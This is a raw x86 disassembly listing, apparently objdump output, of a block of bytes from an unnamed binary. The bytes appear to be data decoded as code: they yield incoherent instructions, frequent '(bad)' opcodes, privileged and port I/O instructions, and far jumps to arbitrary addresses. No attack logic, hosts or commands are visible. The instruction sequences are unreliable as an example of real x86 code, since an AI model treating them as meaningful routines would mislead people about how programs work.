  427f94:	inc    esi
  427f95:	outs   dx,BYTE PTR ds:[esi]
  427f96:	shr    DWORD PTR [ebx+0x51],1
  427f99:	outs   dx,BYTE PTR ds:[esi]
  427f9a:	cmc    
  427f9b:	dec    edi
  427f9c:	iret   
  427f9d:	or     al,0x4
  427f9f:	adc    esi,DWORD PTR ds:0xb07f1c4b
  427fa5:	(bad)  
  427fa6:	and    al,0x26
  427fa8:	push   esp
  427fa9:	cmp    al,0x96
  427fab:	(bad)  
  427fad:	sub    al,0xd1
  427faf:	pop    ss
  427fb0:	jnp    0x427f32
  427fb2:	rol    DWORD PTR [ebx-0x129d99cb],1
  427fb8:	adc    dl,BYTE PTR [eax-0x526c8cc7]
  427fbe:	or     BYTE PTR [edi+0x5b152f22],0x48
  427fc5:	dec    eax
  427fc6:	push   ss
  427fc7:	ja     0x42803e
  427fc9:	sbb    eax,0xa8a7a332
  427fce:	sbb    DWORD PTR [eax+0x18],esp
  427fd1:	mov    eax,ds:0xe9d800f2
  427fd6:	stos   BYTE PTR es:[edi],al
  427fd7:	sub    dh,bh
  427fd9:	dec    ebx
  427fda:	xchg   ecx,eax
  427fdb:	test   DWORD PTR [ebx-0x63b06c48],eax
  427fe1:	pop    es
  427fe2:	xor    al,BYTE PTR [edx+0x47]
  427fe5:	mov    eax,0xb8216e22
  427fea:	test   eax,0x613a
	...
  428053:	add    BYTE PTR [eax],al
  428055:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	pop    esi
  428063:	jae    0x4280a9
  428065:	cld    
  428066:	xchg   ecx,eax
  428067:	lods   al,BYTE PTR ds:[esi]
  428068:	add    DWORD PTR [eax],eax
  42806a:	inc    DWORD PTR [eax]
  42806c:	add    BYTE PTR [eax],al
  42806e:	adc    al,0x26
  428070:	xchg   esi,eax
  428071:	mov    ch,0xa3
  428073:	das    
  428074:	stos   BYTE PTR es:[edi],al
  428075:	jge    0x42808b
  428077:	xchg   edx,eax
  428078:	in     eax,0xda
  42807a:	test   al,0x89
  42807c:	dec    esp
  42807d:	sub    ah,bl
  42807f:	sbb    eax,0x970ba5f1
  428084:	pop    ebx
  428085:	dec    ebx
  428086:	imul   esi,DWORD PTR [edx+0x18ba40f4],0x11f292e7
  428090:	sti    
  428091:	jecxz  0x42806e
  428093:	cld    
  428094:	sub    dl,cl
  428096:	hlt    
  428097:	fnstcw WORD PTR [ebp+0x35]
  42809a:	add    ch,al
  42809c:	lods   eax,DWORD PTR ds:[esi]
  42809d:	fsub   DWORD PTR [edi+0x45]
  4280a0:	hlt    
  4280a1:	xlat   BYTE PTR ds:[ebx]
  4280a2:	jmp    0x428057
  4280a4:	adc    BYTE PTR [edi],ah
  4280a6:	xchg   ebp,eax
  4280a7:	jp     0x42805f
  4280a9:	dec    edx
  4280aa:	jg     0x428076
  4280ac:	push   esi
  4280ad:	mov    cl,0x4e
  4280af:	adc    DWORD PTR [eax],esp
  4280b1:	mov    cl,0xd3
  4280b3:	push   cs
  4280b4:	mov    fs,WORD PTR [edx-0xf]
  4280b7:	mov    cl,0x2a
  4280b9:	retf   0x5b12
  4280bc:	xor    eax,edx
  4280be:	stos   DWORD PTR es:[edi],eax
  4280bf:	mov    al,ds:0x93831a78
  4280c4:	aam    0xfd
  4280c6:	fisttp WORD PTR [eax-0x5c5a3f94]
  4280cc:	xchg   edx,eax
  4280cd:	repz sub esi,0x6bb66328
  4280d4:	fild   DWORD PTR [edi+0x7f80c06b]
  4280da:	jmp    0x428136
  4280dc:	add    eax,DWORD PTR [edi]
  4280de:	std    
  4280df:	pop    es
  4280e0:	xlat   BYTE PTR ds:[ebx]
  4280e1:	jbe    0x4280c6
  4280e3:	ror    DWORD PTR [edi+0x1d],1
  4280e6:	mov    ds,WORD PTR [ecx]
  4280e8:	lea    ebp,[esi+0x1e]
  4280eb:	enter  0xb319,0x2e
  4280ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280f0:	and    bh,BYTE PTR [eax+eax*1]
  4280f3:	mov    eax,ds:0x13d49b5f
  4280f8:	js     0x428082
  4280fa:	sbb    al,0x13
  4280fc:	or     ch,BYTE PTR [ebp-0x4595d591]
  428102:	ins    BYTE PTR es:[edi],dx
  428103:	mov    bl,0x63
  428105:	xchg   esi,eax
  428106:	add    al,0x7c
  428108:	xor    BYTE PTR [esi],dh
  42810a:	cmp    eax,0x9cee159c
  42810f:	scas   eax,DWORD PTR es:[edi]
  428110:	jnp    0x4280f7
  428112:	scas   al,BYTE PTR es:[edi]
  428113:	sqrtps xmm5,xmm0
  428116:	cmp    bl,bh
  428118:	daa    
  428119:	mov    BYTE PTR [eax+0xb],0xab
  42811d:	lods   al,BYTE PTR ds:[esi]
  42811e:	sbb    BYTE PTR [ebp-0x424cbee5],ah
  428124:	push   0xffffffbd
  428126:	push   ecx
  428127:	cwde   
  428128:	mov    ebx,DWORD PTR [eax]
  42812a:	push   ds
  42812b:	xor    eax,0x305a8856
  428130:	cdq    
  428131:	jno    0x42812e
  428133:	push   es
  428134:	jl     0x428171
  428136:	into   
  428137:	jmp    0x4c465aa3
  42813c:	ins    BYTE PTR es:[edi],dx
  42813d:	fs pop edi
  42813f:	inc    ecx
  428140:	sub    al,BYTE PTR [ebp+0x12aa7d12]
  428146:	mov    al,0xef
  428148:	mov    bl,0xe4
  42814a:	xchg   ebp,eax
  42814b:	retf   
  42814c:	enter  0x19f3,0x3f
  428150:	xchg   ecx,eax
  428151:	inc    esp
  428152:	cmovb  edi,DWORD PTR [ecx-0x24d90e30]
  428159:	jl     0x428173
  42815b:	inc    esp
  42815c:	fwait
  42815d:	test   eax,0x6a41877d
  428162:	ret    0xd6c3
  428165:	pop    ebx
  428166:	push   eax
  428167:	sar    edx,0x4b
  42816a:	jmp    0x428186
  42816c:	inc    edx
	...
  4281d5:	add    bh,bl
  4281d7:	out    dx,al
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	rcl    DWORD PTR [edi],cl
  4281e4:	ins    DWORD PTR es:[edi],dx
  4281e5:	push   ds
  4281e6:	nop
  4281e7:	lods   eax,DWORD PTR ds:[esi]
  4281e8:	add    DWORD PTR [eax],eax
  4281ea:	inc    DWORD PTR [eax]
  4281ec:	add    BYTE PTR [eax],al
  4281ee:	pop    es
  4281ef:	jb     0x4281d9
  4281f1:	pop    ebx
  4281f2:	leave  
  4281f3:	adc    BYTE PTR [esi+0x22d7e377],al
  4281f9:	push   0x4
  4281fb:	mov    ah,0x61
  4281fd:	(bad)
  428200:	cmp    ecx,edx
  428202:	mov    ecx,ebx
  428204:	(bad)  
  428205:	test   DWORD PTR [ecx+0x54],0xe5685036
  42820c:	out    dx,eax
  42820d:	stos   DWORD PTR es:[edi],eax
  42820e:	jecxz  0x428190
  428210:	push   esp
  428211:	mov    al,ds:0x4eda8cea
  428216:	(bad)  
  428217:	mov    ebp,DWORD PTR [esi]
  428219:	cld    
  42821a:	pop    edi
  42821b:	push   edi
  42821c:	daa    
  42821d:	and    al,ah
  42821f:	ret    0x2a3
  428222:	mov    edx,0x28bb2c51
  428227:	inc    esp
  428228:	xor    dh,BYTE PTR [edx+0x73329346]
  42822e:	xchg   edx,eax
  42822f:	int    0xd5
  428231:	dec    edx
  428232:	push   0xffffffc4
  428234:	outs   dx,BYTE PTR ds:[esi]
  428235:	add    cl,0xe
  428238:	rol    DWORD PTR [esi+0x37],cl
  42823b:	mov    esp,0xd703b097
  428240:	clc    
  428241:	adc    dl,al
  428243:	aad    0xd1
  428245:	aaa    
  428246:	inc    edx
  428247:	jle    0x42827d
  428249:	pop    ss
  42824a:	and    eax,0xe4e1841c
  42824f:	xchg   esi,eax
  428250:	mov    cl,0xd8
  428252:	jns    0x428248
  428254:	inc    ebp
  428255:	adc    BYTE PTR [esi+0x4ac4e078],cl
  42825b:	mov    ds:0xcc0d48fe,al
  428260:	int3   
  428261:	or     eax,0x3b4f628d
  428266:	fs ds mov ah,0x5d
  42826a:	aad    0xba
  42826c:	xchg   edi,eax
  42826d:	imul   ebx,DWORD PTR [ecx],0xc86ba9f0
  428273:	(bad)  
  428274:	(bad)  
  428275:	int3   
  428276:	pop    edi
  428277:	fwait
  428278:	xchg   edx,eax
  428279:	and    eax,0xd4a95090
  42827e:	sub    eax,0xb20b2874
  428283:	inc    esi
  428284:	fcom   DWORD PTR [edi+0x29]
  428287:	sti    
  428288:	jne    0x4282e3
  42828a:	ins    BYTE PTR es:[edi],dx
  42828b:	jmp    0x4282ce
  42828d:	mov    gs,WORD PTR [edx]
  42828f:	and    ecx,ebp
  428291:	imul   esi,DWORD PTR [ecx-0x54025206],0xffffffee
  428298:	fs xchg ecx,eax
  42829a:	fmul   st(3),st
  42829c:	loopne 0x428296
  42829e:	ins    BYTE PTR es:[edi],dx
  42829f:	outs   dx,DWORD PTR ds:[esi]
  4282a0:	test   eax,0x9111963f
  4282a5:	pop    edi
  4282a6:	stos   BYTE PTR es:[edi],al
  4282a7:	sbb    DWORD PTR ds:0xab686937,esi
  4282ad:	lods   eax,DWORD PTR ds:[esi]
  4282ae:	bound  edi,QWORD PTR [edi+0x69]
  4282b1:	rcl    esp,cl
  4282b3:	fsubr  DWORD PTR [ecx]
  4282b5:	push   cs
  4282b6:	sbb    BYTE PTR [ebx+0x4a5134ce],0x29
  4282bd:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4282bf:	hlt    
  4282c0:	mov    ah,BYTE PTR [ebx-0xa0a8eb8]
  4282c6:	xchg   BYTE PTR [ecx-0x63],ch
  4282c9:	add    al,0x53
  4282cb:	out    0x36,eax
  4282cd:	cmp    bl,BYTE PTR [ebx]
  4282cf:	fisttp WORD PTR [esi]
  4282d1:	xchg   edi,eax
  4282d2:	xor    al,BYTE PTR [ebx+0x41]
  4282d5:	pop    esp
  4282d6:	mov    esi,DWORD PTR [edi+0x35]
  4282d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4282da:	and    ah,bl
  4282dc:	push   edi
  4282dd:	lahf   
  4282de:	scas   al,BYTE PTR es:[edi]
  4282df:	jle    0x428264
  4282e1:	jo     0x428285
  4282e3:	inc    esi
  4282e4:	cs mov BYTE PTR ds:[edx-0x5d],bh
  4282e9:	dec    esi
  4282ea:	lods   eax,DWORD PTR ds:[esi]
  4282eb:	jns    0x428292
	...
  428355:	add    bh,al
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	inc    edx
  428363:	inc    ebp
  428364:	or     esp,edi
  428366:	(bad)  
  428367:	scas   al,BYTE PTR es:[edi]
  428368:	add    DWORD PTR [eax],eax
  42836a:	inc    DWORD PTR [eax]
  42836c:	add    BYTE PTR [eax],al
  42836e:	dec    edi
  42836f:	push   eax
  428370:	sbb    eax,0x838f2921
  428375:	push   esp
  428376:	out    0x77,al
  428378:	stos   DWORD PTR es:[edi],eax
  428379:	and    esi,DWORD PTR [edi]
  42837b:	test   ebp,edi
  42837d:	imul   esi,DWORD PTR [eax+0x79],0x4e18e4be
  428384:	not    BYTE PTR [ecx]
  428386:	pop    ebp
  428387:	mov    WORD PTR [edi-0x29],cs
  42838a:	(bad)  
  42838b:	bound  edi,QWORD PTR [ecx+0x753d0dd6]
  428391:	lods   eax,DWORD PTR ds:[esi]
  428392:	lock test BYTE PTR [eax],ah
  428395:	push   es
  428396:	push   es
  428397:	and    DWORD PTR [ecx],ecx
  428399:	icebp  
  42839a:	icebp  
  42839b:	pop    es
  42839c:	cwde   
  42839d:	(bad)  
  42839f:	fwait
  4283a0:	pop    ebx
  4283a1:	test   al,0xa5
  4283a3:	sub    esp,esi
  4283a5:	and    edi,esi
  4283a7:	sti    
  4283a8:	je     0x428412
  4283aa:	call   0xa3d9:0x910f68ec
  4283b1:	call   0x56d76799
  4283b6:	push   ss
  4283b7:	cld    
  4283b8:	fist   WORD PTR [edi+0x31]
  4283bb:	inc    ebx
  4283bc:	pop    eax
  4283bd:	stos   BYTE PTR es:[edi],al
  4283be:	popa   
  4283bf:	data16 in al,dx
  4283c1:	std    
  4283c2:	cli    
  4283c3:	adc    DWORD PTR [edi*4-0x506bf984],edx
  4283ca:	scas   al,BYTE PTR es:[edi]
  4283cb:	daa    
  4283cc:	aas    
  4283cd:	pop    ss
  4283ce:	sub    DWORD PTR [eax+0x1a27bec0],esi
  4283d4:	add    al,bl
  4283d6:	mov    edx,0x422a5845
  4283db:	stos   DWORD PTR es:[edi],eax
  4283dc:	in     eax,0xd0
  4283de:	xchg   ecx,eax
  4283df:	imul   edi,DWORD PTR [ecx],0x9585c2b4
  4283e5:	jo     0x42837f
  4283e7:	adc    eax,0xff7f53ee
  4283ec:	sbb    DWORD PTR [ebx+0x3b],ecx
  4283ef:	jle    0x4283fc
  4283f1:	xchg   edi,eax
  4283f2:	jo     0x428408
  4283f4:	gs mov bh,0xca
  4283f7:	imul   ebp,DWORD PTR [eax-0x61fca97a],0x5fdd9761
  428401:	call   0xa0242db
  428406:	dec    ebx
  428407:	ret    0x329f
  42840a:	pop    eax
  42840b:	pop    esi
  42840c:	push   eax
  42840d:	inc    ecx
  42840e:	push   0xc71609a0
  428413:	ja     0x4283af
  428415:	out    0x9b,al
  428417:	adc    BYTE PTR [esi+0x4b],bh
  42841a:	dec    ecx
  42841b:	cmc    
  42841c:	repz xchg esp,eax
  42841e:	mov    ds:0xc3a8c5ba,eax
  428423:	ds dec edx
  428425:	shl    ebx,0x5c
  428428:	and    esi,DWORD PTR [ecx+0x13ee7055]
  42842e:	mov    bl,0x2e
  428430:	add    edx,edx
  428432:	test   BYTE PTR [ecx+eax*8+0x70],al
  428436:	repz mov ch,0x8c
  428439:	or     al,dl
  42843b:	sub    BYTE PTR [edx+edx*1-0x42a7b63a],al
  428442:	dec    ebp
  428443:	adc    cl,BYTE PTR [esi+eiz*2]
  428446:	mov    bl,0x26
  428448:	mov    DWORD PTR [edx-0x212d76a9],edi
  42844e:	mov    esp,0xf789de3
  428453:	xchg   ebx,eax
  428454:	lods   al,BYTE PTR ds:[esi]
  428455:	popa   
  428456:	daa    
  428457:	inc    esi
  428458:	mov    dh,BYTE PTR [edx+0x40ed471c]
  42845e:	jmp    0x28b897a2
  428463:	jmp    0xd4ed:0x3711337e
  42846a:	jge    0x42844b
  42846c:	dec    edi
	...
  4284d5:	add    BYTE PTR [esi],cl
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0x22abfb32
  4284e3:	ins    BYTE PTR es:[edi],dx
  4284e4:	jl     0x42848a
  4284e6:	mov    gs,WORD PTR [edi+0xff0001]
  4284ec:	add    BYTE PTR [eax],al
  4284ee:	std    
  4284ef:	pop    es
  4284f0:	daa    
  4284f1:	fs jp  0x4284c9
  4284f4:	sti    
  4284f5:	cld    
  4284f6:	and    eax,0x9e7bb873
  4284fb:	push   0xffffffe0
  4284fd:	bound  esp,QWORD PTR [ebp+0x6e4654a]
  428503:	in     al,0x46
  428505:	xlat   BYTE PTR ds:[ebx]
  428506:	push   ebx
  428507:	test   BYTE PTR [edx],ch
  428509:	jns    0x4284db
  42850b:	dec    eax
  42850c:	mov    eax,0xf73da09d
  428511:	fimul  WORD PTR [eax]
  428513:	sbb    BYTE PTR [edx+0x6b],bh
  428516:	(bad)  
  428517:	cmp    cl,BYTE PTR [ebp-0x9]
  42851a:	mov    esp,0x3eaac7a0
  42851f:	xchg   BYTE PTR [edx],al
  428521:	cmc    
  428522:	xor    dh,bl
  428524:	pop    ds
  428525:	outs   dx,DWORD PTR ds:[esi]
  428526:	pop    esp
  428527:	lods   eax,DWORD PTR ds:[esi]
  428528:	rcl    ebp,0x38
  42852b:	xchg   edi,eax
  42852c:	add    al,0xa9
  42852e:	inc    esi
  42852f:	sbb    BYTE PTR [esi-0x1b],dl
  428532:	adc    edx,ecx
  428534:	call   0x5227:0x5f8207a
  42853b:	mov    edx,0x98c8856b
  428540:	stos   BYTE PTR es:[edi],al
  428541:	mov    ds:0xc73bd055,eax
  428546:	cmp    eax,DWORD PTR [bp+di+0x31a9]
  42854b:	repnz mov ecx,ebp
  42854e:	mov    edx,eax
  428550:	test   al,0x4d
  428552:	push   esi
  428553:	mov    edx,0x2cb3be75
  428558:	mov    bl,0x54
  42855a:	or     BYTE PTR [ebx+0x5ec953a1],dl
  428560:	(bad)  [edx]
  428562:	fnsave [edi+0x7889f1dd]
  428568:	pop    es
  428569:	mov    ah,0x50
  42856b:	retf   
  42856c:	retf   0x4d36
  42856f:	inc    ecx
  428570:	call   0xb918:0x4c6b9cb2
  428577:	test   edi,ebp
  428579:	mov    bh,0xc8
  42857b:	imul   ecx,DWORD PTR [edx],0x44
  42857e:	mov    eax,0xbbae3213
  428583:	out    0x4c,eax
  428585:	push   es
  428586:	pop    esi
  428587:	pop    ebx
  428588:	jno    0x4285fd
  42858a:	xchg   ecx,eax
  42858b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  42858d:	enter  0x3e7f,0x3
  428591:	sub    ebp,DWORD PTR [ebx]
  428593:	push   DWORD PTR [ecx]
  428595:	out    dx,eax
  428596:	push   ss
  428597:	push   esi
  428598:	pop    ds
  428599:	loope  0x4285f0
  42859b:	pusha  
  42859c:	inc    ebx
  42859d:	mov    ah,0x79
  42859f:	jge    0x428612
  4285a1:	mul    edx
  4285a3:	cdq    
  4285a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4285a5:	fisubr DWORD PTR [ebp+0x7]
  4285a8:	and    BYTE PTR [edx],dl
  4285aa:	xchg   ebp,eax
  4285ab:	dec    esp
  4285ac:	mov    dh,0xe
  4285ae:	call   DWORD PTR ds:0xb8387945
  4285b4:	js     0x428635
  4285b6:	xor    al,0xa2
  4285b8:	push   ss
  4285b9:	das    
  4285ba:	pop    es
  4285bb:	xor    esp,esi
  4285bd:	pop    es
  4285be:	loopne 0x428547
  4285c0:	cmc    
  4285c1:	dec    esp
  4285c2:	cmp    eax,0x67204482
  4285c7:	aaa    
  4285c8:	adc    ebx,DWORD PTR [eax-0x7d492435]
  4285ce:	mov    BYTE PTR [ecx],cl
  4285d0:	sbb    al,0x36
  4285d2:	sub    al,0xe6
  4285d4:	mov    fs,WORD PTR [ebx]
  4285d6:	es fstp st(2)
  4285d9:	adc    ebx,esp
  4285db:	lods   eax,DWORD PTR ds:[esi]
  4285dc:	inc    ebx
  4285dd:	push   0x5e
  4285df:	in     eax,0x14
  4285e1:	push   ds
  4285e2:	inc    DWORD PTR [eax]
  4285e4:	das    
  4285e5:	mov    DWORD PTR [eax],0x2d30c9d0
  4285eb:	inc    edx
  4285ec:	inc    ebx
	...
  428655:	add    BYTE PTR [ecx-0xa],dl
  428658:	xor    eax,0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0x3e87a3f6
  428664:	in     al,0xf8
  428666:	lea    esi,[eax+0xff0001]
  42866c:	add    BYTE PTR [eax],al
  42866e:	push   0x32
  428670:	mov    ebp,0xd96bef50
  428675:	fbld   TBYTE PTR [edi-0x6]
  428678:	pop    eax
  428679:	push   edi
  42867a:	jo     0x428675
  42867c:	rcl    DWORD PTR [edx-0x44e542b5],cl
  428682:	xchg   ebp,eax
  428683:	mov    dh,0xce
  428685:	aad    0xa
  428687:	ds push 0xffffffcc
  42868a:	cmp    al,0xc7
  42868c:	xor    DWORD PTR [edi-0x1d],edi
  42868f:	xor    ch,BYTE PTR [eax]
  428691:	cmp    al,0x6e
  428693:	xor    cl,BYTE PTR [eax+0x6]
  428696:	aaa    
  428697:	pop    ds
  428698:	sub    eax,DWORD PTR [ebp+edi*8-0x4beef4f7]
  42869f:	push   es
  4286a0:	aas    
  4286a1:	out    dx,al
  4286a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286a3:	dec    eax
  4286a4:	xchg   ebx,eax
  4286a5:	fist   DWORD PTR gs:[eax+0x2a5eea63]
  4286ac:	hlt    
  4286ad:	sbb    ebp,DWORD PTR [ebp-0x44]
  4286b0:	test   DWORD PTR [edi-0x7a],esi
  4286b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286b4:	sahf   
  4286b5:	xchg   esi,eax
  4286b6:	cmp    edi,DWORD PTR [edx-0x65734150]
  4286bc:	mov    ah,0x85
  4286be:	repnz pop esi
  4286c0:	mov    bh,0x5b
  4286c2:	popa   
  4286c3:	ss test eax,0xd42ace2
  4286c9:	add    edi,eax
  4286cb:	test   BYTE PTR [ecx-0x7f30e749],bh
  4286d1:	jle    0x428727
  4286d3:	outs   dx,DWORD PTR ds:[esi]
  4286d4:	clc    
  4286d5:	lods   al,BYTE PTR ds:[esi]
  4286d6:	xchg   edi,eax
  4286d7:	dec    esp
  4286d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4286d9:	clc    
  4286da:	cmp    DWORD PTR [eax+0x492d7362],eax
  4286e0:	mov    dl,0xf
  4286e2:	call   0x7302d5a6
  4286e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286e8:	cs push edx
  4286ea:	mul    BYTE PTR [edx+0x3ee1c339]
  4286f0:	sbb    eax,0xf665120f
  4286f6:	aaa    
  4286f7:	mov    ah,0x48
  4286f9:	mov    dh,0xad
  4286fb:	add    ah,ah
  4286fd:	aas    
  4286fe:	or     eax,edi
  428700:	(bad)
  428703:	jmp    0x428713
  428705:	adc    eax,0x13136a
  42870a:	or     al,0x75
  42870c:	push   ecx
  42870d:	sbb    al,BYTE PTR ds:0x3114a6b8
  428713:	fcomp  QWORD PTR [ebp-0x52fa703c]
  428719:	jns    0x4286c8
  42871b:	inc    edi
  42871c:	xchg   ecx,eax
  42871d:	mov    eax,0xede9a3cb
  428722:	leave  
  428723:	inc    edi
  428724:	sub    ebp,DWORD PTR [ecx-0x5ae12dde]
  42872a:	outs   dx,DWORD PTR ds:[esi]
  42872b:	xor    eax,0xe67240ea
  428730:	or     eax,0x10ae33e7
  428735:	xchg   ebp,eax
  428736:	mov    bl,0x86
  428738:	cwde   
  428739:	jns    0x42877b
  42873b:	lods   eax,DWORD PTR ds:[esi]
  42873c:	dec    ecx
  42873d:	push   eax
  42873e:	les    edx,FWORD PTR [eax-0x8]
  428741:	push   0xffffff82
  428743:	test   cl,al
  428745:	cmc    
  428746:	push   edx
  428747:	xchg   esp,eax
  428748:	outs   dx,BYTE PTR ds:[esi]
  428749:	sbb    esi,DWORD PTR ds:0x7c010bbc
  42874f:	loopne 0x42874a
  428751:	iret   
  428752:	aam    0x91
  428754:	jg     0x428740
  428756:	inc    esi
  428757:	sub    DWORD PTR [ebp-0x11],eax
  42875a:	out    dx,eax
  42875b:	shl    BYTE PTR [esi+0x24],cl
  42875e:	cld    
  42875f:	fcmovu st,st(2)
  428761:	push   0xffffffe5
  428763:	jle    0x428780
  428765:	or     al,0x5a
  428767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428768:	push   0x3ff56747
	...
  4287d5:	add    BYTE PTR [esi+0x5b],dl
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x23748bf8
  4287e5:	sbb    ecx,DWORD PTR [ecx+esi*4+0xff0001]
  4287ec:	add    BYTE PTR [eax],al
  4287ee:	gs cdq 
  4287f0:	mov    ds:0xfa3eca3b,eax
  4287f5:	jb     0x42877e
  4287f7:	push   ds
  4287f8:	ds xchg ebp,eax
  4287fa:	out    0xa5,al
  4287fc:	nop
  4287fd:	(bad)  
  4287fe:	das    
  4287ff:	outs   dx,BYTE PTR ds:[esi]
  428800:	aas    
  428801:	in     eax,0xc1
  428803:	lock fwait
  428805:	inc    eax
  428806:	push   ss
  428807:	sub    cl,BYTE PTR [bx+si+0x5d8b]
  42880c:	cwde   
  42880d:	add    al,0x27
  42880f:	mov    eax,ds:0x86c7f06b
  428814:	push   ecx
  428815:	and    al,0xb6
  428817:	call   0xa87a63e4
  42881c:	cwde   
  42881d:	es (bad) 
  428820:	inc    edi
  428821:	ds push ds
  428823:	inc    esp
  428824:	mov    eax,ds:0x1ed60b85
  428829:	jge    0x42880c
  42882b:	cdq    
  42882c:	out    0xca,al
  42882e:	dec    ecx
  42882f:	jmp    0x95f4:0x62d49e60
  428836:	arpl   WORD PTR [esi-0x7a3571b4],dx
  42883c:	out    dx,al
  42883d:	mov    DWORD PTR [ecx+0x3137bd1b],edi
  428843:	loopne 0x428851
  428845:	in     al,0x70
  428847:	mov    dl,0xc4
  428849:	nop
  42884a:	popf   
  42884b:	xor    dh,ah
  42884d:	mov    edx,0xe6dede6b
  428852:	call   0x9ce1:0x7d90a0e0
  428859:	cmp    esp,DWORD PTR [ebx-0x1a]
  42885c:	jmp    0x3738:0x4165305b
  428863:	outs   dx,DWORD PTR ds:[esi]
  428864:	cli    
  428865:	push   edx
  428866:	sar    BYTE PTR [ebp-0xc9783d7],1
  42886c:	dec    edx
  42886d:	jge    0x42885c
  42886f:	fild   QWORD PTR [edi+0x35722e21]
  428875:	outs   dx,BYTE PTR ds:[esi]
  428876:	pop    ecx
  428877:	push   eax
  428878:	daa    
  428879:	jmp    0x1e270ee1
  42887e:	mov    ds:0x9d924eb4,al
  428883:	lahf   
  428884:	sbb    bh,BYTE PTR [ecx+edx*2-0x44cd5dea]
  42888b:	(bad)  
  42888c:	(bad)  
  42888d:	mov    ds:0xba9db3e4,eax
  428892:	rol    BYTE PTR [esp+ebx*2+0x63],0x99
  428897:	jl     0x42886b
  428899:	stc    
  42889a:	and    ecx,DWORD PTR es:[ecx]
  42889d:	xchg   esi,eax
  42889e:	das    
  42889f:	cmp    DWORD PTR [ecx+0x32],esi
  4288a2:	in     al,dx
  4288a3:	pop    ebx
  4288a4:	fwait
  4288a5:	test   eax,0x6e780801
  4288aa:	mov    es,WORD PTR [bx+di]
  4288ad:	in     al,dx
  4288ae:	rcr    BYTE PTR [ebx+eax*1-0x1a906764],0x40
  4288b6:	push   0xffffffdf
  4288b8:	stc    
  4288b9:	icebp  
  4288ba:	add    BYTE PTR [ecx+edx*4+0x359b9612],ch
  4288c1:	retf   0x7b5c
  4288c4:	xchg   ebp,eax
  4288c5:	call   0x93348a44
  4288ca:	shr    DWORD PTR [edx-0x744cb542],cl
  4288d0:	inc    DWORD PTR [esi]
  4288d2:	mov    esp,0xd7de6334
  4288d7:	push   esi
  4288d8:	mul    DWORD PTR [esi+ebp*4-0x65]
  4288dc:	sbb    DWORD PTR [esi],edi
  4288de:	addr16 inc edx
  4288e0:	and    DWORD PTR [edi-0x231b95f2],edx
  4288e6:	imul   eax,DWORD PTR [edx],0x28
  4288e9:	add    esi,DWORD PTR ds:0xb807
	...
  428953:	add    BYTE PTR [eax],al
  428955:	add    BYTE PTR [esi],ah
  428957:	jp     0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi-0x502462f1],bx
  428964:	(bad)  
  428965:	sub    al,0x8b
  428967:	mov    dl,0x1
  428969:	add    bh,bh
  42896b:	add    BYTE PTR [eax],al
  42896d:	add    BYTE PTR [eax],bl
  42896f:	and    edx,esi
  428971:	clc    
  428972:	cmp    eax,0xa7bd4a4
  428977:	pop    ecx
  428978:	cmp    bl,BYTE PTR [ebx]
  42897a:	jle    0x428961
  42897c:	jle    0x428929
  42897e:	stos   DWORD PTR es:[edi],eax
  42897f:	es dec edx
  428981:	mov    bl,0xee
  428983:	ss xchg ecx,eax
  428985:	pop    ds
  428986:	jns    0x4289d8
  428988:	sub    al,cl
  42898a:	lahf   
  42898b:	pop    eax
  42898c:	sbb    BYTE PTR [esi-0x6ae2c6e5],ch
  428992:	push   esp
  428993:	mov    bh,0x36
  428995:	sub    bh,0xe8
  428998:	and    eax,0x2807f7ed
  42899d:	adc    DWORD PTR [ebp+0x24e80561],esp
  4289a3:	mov    ah,0xbb
  4289a5:	jmp    0x9cb3:0xb77bc75c
  4289ac:	adc    dh,dh
  4289ae:	sbb    edx,DWORD PTR [ebx-0x39dd9a2c]
  4289b4:	jl     0x428a0d
  4289b6:	jnp    0x4289a5
  4289b8:	shl    esp,1
  4289ba:	imul   eax,DWORD PTR [edi],0xdcab31da
  4289c0:	stc    
  4289c1:	mov    ds,esp
  4289c3:	imul   esp,DWORD PTR [ebx],0x2a
  4289c6:	jl     0x428a30
  4289c8:	not    eax
  4289ca:	fadd   DWORD PTR [edi]
  4289cc:	push   es
  4289cd:	lahf   
  4289ce:	xchg   ecx,eax
  4289cf:	mov    ecx,0x96c8cbbf
  4289d4:	(bad)  
  4289d5:	mov    ss,WORD PTR ss:[esi-0x11]
  4289d9:	cmp    eax,0x7bd1b1b2
  4289de:	or     eax,0xb55f934
  4289e3:	fidiv  DWORD PTR [ebp+edi*4+0x46]
  4289e7:	lods   al,BYTE PTR ds:[esi]
  4289e8:	ret    0x78d7
  4289eb:	mov    eax,0xedc9f34b
  4289f0:	mov    dl,0x61
  4289f2:	scas   eax,DWORD PTR es:[edi]
  4289f3:	and    dh,dl
  4289f5:	sbb    ebx,edi
  4289f7:	or     ah,BYTE PTR fs:0x57ed80ae
  4289fe:	jl     0x4289ce
  428a00:	faddp  st(2),st
  428a02:	pop    ecx
  428a03:	js     0x4289a0
  428a05:	in     eax,dx
  428a06:	sbb    eax,0x35dba1cd
  428a0b:	push   es
  428a0c:	dec    esp
